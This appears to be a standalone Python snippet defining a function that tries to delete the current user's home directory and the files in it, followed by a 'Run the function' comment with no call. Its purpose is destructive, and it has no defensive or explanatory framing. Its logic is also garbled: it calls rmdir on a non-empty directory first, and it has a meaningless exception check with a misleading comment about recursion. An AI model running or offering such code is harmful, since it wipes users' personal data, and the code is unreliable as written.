def delete_home_directory():
    try:
        # Delete the home directory
        import os
        if os.path.exists(os.path.expanduser('~')):
            os.rmdir(os.path.expanduser('~'))
        # Remove any remaining files in the directory
        for filename in os.listdir(os.path.expanduser('~')):
            file_path = os.path.join(os.path.expanduser('~'), filename)
            if os.path.isfile(file_path):
                os.remove(file_path)
            elif os.path.isdir(file_path):
                # Avoid infinite recursion by catching the NotADirectoryError
                import sys
                if sys.exc_info()[0] is not isinstance(NotADirectoryError, Exception):
                    os.rmdir(file_path)
    except Exception as e:
        print(f"An error occurred: {e}")

# Run the function
